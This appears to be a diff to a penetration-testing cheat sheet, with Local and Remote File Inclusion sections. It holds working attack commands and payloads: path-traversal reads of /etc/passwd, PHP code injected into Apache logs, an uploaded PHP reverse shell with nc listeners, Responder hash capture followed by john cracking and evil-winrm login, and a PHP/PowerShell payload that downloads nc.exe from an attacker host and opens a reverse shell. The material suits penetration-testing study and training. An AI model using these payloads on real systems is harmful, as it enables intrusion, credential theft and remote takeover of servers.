@@ -208,15 +208,29 @@ nc -lvnp 8000
 
 # Local File Inclusion
 
-http://target.com/test.php?page=/etc/passwd
+An attacker is able manipulate a parameter in the URL to get the website to include a file that was not intended to be an option for the application.
 
-- method 2
-nc target.com 80
-GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
-Host: target.com
-Connection: close
+- Example 1:
+Use ../ to traverse directories and read sensitive files.
+Linux: http://target.com/index.php?page=/etc/passwd
+Windows: http://target.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
 
-Send as cmd payload via http://target.com/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
+- Example 2:
+While adding a new entry in an address book web app, instead of uploading a photo, upload a web shell.
+cp /usr/share/webshells/php/php-reverse-shell.php .
+Edit the file by changing the IP and port.
+Use gobuster to bruteforce directories to find where the shell may have uploaded to.
+nc -lvnp 443
+http://target IP/uploads/php-reverse-shell.php
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+- Example 3:
+cd /opt/Responder
+python3 Responder.py -I eth0
+http://target.com/index.php?page=//attacker IP/test
+Copy the account and hash to a file.
+john -w=/usr/share/wordlists/rockyou.txt <Responder hash>
+evil-winrm -i <target IP> -u <user> -p <password>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PHP Version
@@ -236,7 +250,9 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 # Remote File Inclusion
 
-http://target.com/test.php?page=http://<attacker IP>/test.txt
+Similar to a LFI, but in this case the attacker executes code on a remote web server that they control via HTTP or FTP.
+
+http://target.com/index.php?page=http://<attacker IP>/test.txt
 
 - method 2
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
